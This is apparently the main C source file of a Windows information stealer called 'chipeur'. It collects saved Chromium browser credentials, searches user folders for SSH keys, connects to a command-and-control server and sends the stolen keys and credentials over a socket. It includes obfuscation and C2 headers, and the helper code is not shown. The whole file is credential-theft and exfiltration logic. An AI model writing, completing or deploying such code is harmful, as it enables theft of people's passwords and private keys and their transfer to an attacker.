#include "chipeur.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winsock2.h>

#include "chromium.h"
#include "logins.h"
#include "find_ssh_key.h"
#include "obfuscation.h"
#include "c2.h"

int main(void) {
  SetConsoleOutputCP(CP_UTF8);
  Credential credTab[CRED_SIZE] = {0};
  DWORD32 lenCredTab = 0;
  sshKey keysFilenamesTab[MAX_KEY_FILES] = {0};
  DWORD32 lenKeysTab = 0;
  
  steal_chromium_creds(credTab, &lenCredTab);
  find_ssh_key(L"C:\\Users", keysFilenamesTab, &lenKeysTab);

  for (int i = 0; i < lenCredTab; i++){
    printCredential(credTab[i]);
  }

  SOCKET sock;
  BOOL success = connect_to_c2(&sock);
  if (success == 0){
    exit(-1);
  }

  success = send_ssh_key(keysFilenamesTab, lenKeysTab, &sock);
  if (success){
    printf("DEBUG: main: Info, ssh keys sent with success\n");
  }
  success = send_credentials(&sock, credTab, lenCredTab);
  if (success){
    printf("DEBUG: main: Info, creds sent with success\n");
  }
  return EXIT_SUCCESS;
}
